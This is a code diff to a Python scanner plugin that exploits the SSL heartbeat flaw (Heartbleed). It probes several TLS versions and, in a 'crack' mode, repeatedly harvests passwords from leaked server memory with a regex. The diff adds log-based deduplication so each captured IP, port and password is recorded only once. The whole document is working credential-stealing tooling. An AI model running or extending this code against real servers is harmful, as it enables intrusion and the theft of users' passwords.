@@ -90,10 +90,22 @@ def hit_hb(s, version):
     return None
 
 class sslhb_plugin(engine_plugin):
+    strip_set = set()
     
     def __init__(self, name):
         engine_plugin.__init__(self, name)
-
+        
+    def post_init(self):
+        try:
+            self.load_log_dict(self.get_cfg_vaule(None, "load_log"))
+        except:
+            pass
+    
+    def load_log_dict(self, logname):        
+        for line in open(logname, 'r'):
+            key = line.split('\t')[5].replace('\n', '')
+            self.strip_set.add(key)
+        
     def process_sslhb(self, ip, port, filter):
         try:
             for version in ('03 00', '03 01','03 02','03 03'):
@@ -131,16 +143,15 @@ class sslhb_plugin(engine_plugin):
         is_crack = 0
         filter = None
         ports = ['443']
-        strip_dict = {}
         
         try:
             is_crack = int(self.get_cfg_vaule(task_info, "crack"))
-            ports = self.get_cfg_vaule(task_info, "ports").split(" ")
+            ports = self.get_cfg_vaule(task_info, "ports").split(" ")            
         except:
             pass
         
         if is_crack:
-            filter = "([^=;&]+)[&;]*\s*pass\w*=(.+?)[;&\s]"           
+            filter = "([^=;&]+)[&;]*\s*pass\w*=(.+?)[;&\s]"
             
         while True:
             result = None
@@ -153,8 +164,8 @@ class sslhb_plugin(engine_plugin):
             if not is_crack:
                 break
             
-            if result and not strip_dict.has_key(result):
-                strip_dict[result] = 1
+            if result and not result in self.strip_set:
+                self.strip_set.add(result)
                 self.log(task_info, "%s\t%s\t%s" % (ip, port, result))
                 
             time.sleep(10)
